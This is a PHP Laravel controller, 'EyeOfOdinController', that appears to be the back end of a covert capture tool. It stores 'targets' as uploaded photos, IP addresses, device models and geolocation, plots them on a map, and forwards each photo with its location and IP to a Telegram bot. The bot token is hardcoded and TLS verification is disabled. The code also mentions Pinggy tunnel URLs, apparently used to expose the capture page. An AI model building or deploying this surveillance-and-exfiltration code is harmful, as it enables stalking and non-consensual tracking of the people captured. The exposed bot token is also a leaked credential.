<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Target;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Http\JsonResponse;
use Illuminate\Support\Str;

class EyeOfOdinController extends Controller
{
    /**
     * Muestra la vista del mapa profesional (Radar Local).
     */
    public function showMap() 
    { 
        return view('admin.map'); 
    }

    /**
     * Obtiene los puntos geográficos para el Radar.
     * MEJORA: Sanitización estricta para evitar errores en el renderizado del mapa.
     */
   public function mapData(): JsonResponse
{
    $targets = Target::whereNotNull('location')
                     ->where('location', '!=', '0,0') 
                     ->where('location', '!=', 'Sin ubicación')
                     ->get();

    $features = $targets->map(function ($t) {
        // ELIMINA CUALQUIER TEXTO: Solo deja números, puntos, comas y signos menos
        $cleanLoc = preg_replace('/[^0-9.,-]/', '', str_replace('COORD_IP:', '', $t->location));
        $coords = explode(',', $cleanLoc);

        if (count($coords) == 2 && is_numeric($coords[0]) && is_numeric($coords[1])) {
            return [
                'id'     => $t->id,
                'lat'    => (float) $coords[0],
                'lng'    => (float) $coords[1],
                'ip'     => $t->ip,
                'date'   => $t->created_at->format('d/m H:i')
            ];
        }
        return null;
    })->filter()->values();

    return response()->json($features);
}

    /**
     * CAPTURA LOCAL: Almacenamiento directo y normalización de rutas.
     */
    public function capture(Request $request)
    {
        try {
            $photoPath = null;
            $photoName = null;

            if (!Storage::disk('public')->exists('captures')) {
                Storage::disk('public')->makeDirectory('captures', 0775, true);
            }

            if ($request->hasFile('photo') && $request->file('photo')->isValid()) {
                $photoName = 'odin_' . time() . '_' . uniqid() . '.jpg';
                $request->file('photo')->storeAs('captures', $photoName, 'public');
                
                // Guardamos la ruta relativa limpia: 'captures/archivo.jpg'
                $photoPath = 'captures/' . $photoName; 
            }

            $target = new Target();
            $target->name = 'Detección Local';
            $target->ip = $request->ip() ?? '127.0.0.1';
            $target->user_agent = $request->input('device_model') ?? $request->userAgent() ?? 'Sistema Local';
            
            $rawLoc = $request->input('location_data') ?? '0,0';
            $target->location = trim(str_replace('COORD_IP:', '', $rawLoc));

            $target->photo_path = $photoPath;
            $target->save();

            try {
                $this->notifyTelegram($target, $photoName);
            } catch (\Exception $e) {
                Log::info("Modo Offline: Telegram no disponible.");
            }

            return response()->json(['status' => 'success', 'file' => $photoName]);

        } catch (\Exception $e) {
            Log::error("Error en Captura: " . $e->getMessage());
            return response()->json(['status' => 'error'], 500);
        }
    }

    /**
     * Envío a Telegram usando la ruta física local.
     */
    private function notifyTelegram($target, $photoName) 
    {
        $token = "8458522831:AAER4WucjipsFHRD7wbXbC-iZOgNKLgQiYI";
        $chat_id = "5639483306";
        $url = "https://api.telegram.org/bot$token/";
        
        if ($photoName && Storage::disk('public')->exists('captures/' . $photoName)) {
            $fullPath = storage_path('app/public/captures/' . $photoName);
            Http::withoutVerifying()->attach('photo', file_get_contents($fullPath), $photoName)
                ->post($url . "sendPhoto", [
                    'chat_id' => $chat_id,
                    'caption' => "🏠 ODÍN LOCAL\n📍 Loc: {$target->location}\n🌐 IP: {$target->ip}",
                    'parse_mode' => 'Markdown',
                ]);
        }
    }

    /**
     * LIMPIEZA AGRESIVA: Elimina cualquier rastro de Pinggy o URLs externas.
     * Obliga a la base de datos a tener rutas locales puras.
     */
    public function cleanDatabasePaths()
    {
        $targets = Target::whereNotNull('photo_path')->get();
        $count = 0;
        foreach ($targets as $target) {
            // Si la ruta contiene http, pinggy o prefijos innecesarios
            if (str_contains($target->photo_path, 'http') || str_contains($target->photo_path, 'pinggy') || str_contains($target->photo_path, 'storage/')) {
                
                // Extraemos solo el nombre real del archivo (ej: odin_123.jpg)
                $fileName = basename($target->photo_path);
                
                // Normalizamos a la ruta local estándar
                $target->photo_path = 'captures/' . $fileName;
                if ($target->save()) { 
                    $count++; 
                }
            }
        }
        
        return response()->json([
            'status' => 'success', 
            'registros_corregidos' => $count,
            'mensaje' => 'Sistema purificado. Rutas externas eliminadas.'
        ]);
    }

    /**
     * Sincroniza el enlace simbólico y limpia caché.
     */
    public function fixSystem()
    {
        try {
            Artisan::call('storage:link');
            Artisan::call('optimize:clear');
            return "✅ Enlace Local Vinculado y Caché Limpia.";
        } catch (\Exception $e) {
            return "❌ Error: " . $e->getMessage();
        }
    }

    public function listCaptures() 
    {
        return view('admin.list_captures', ['targets' => Target::latest()->get()]);
    }

    public function show($id) 
    { 
        return view('admin.target_show', ['target' => Target::findOrFail($id)]); 
    }
}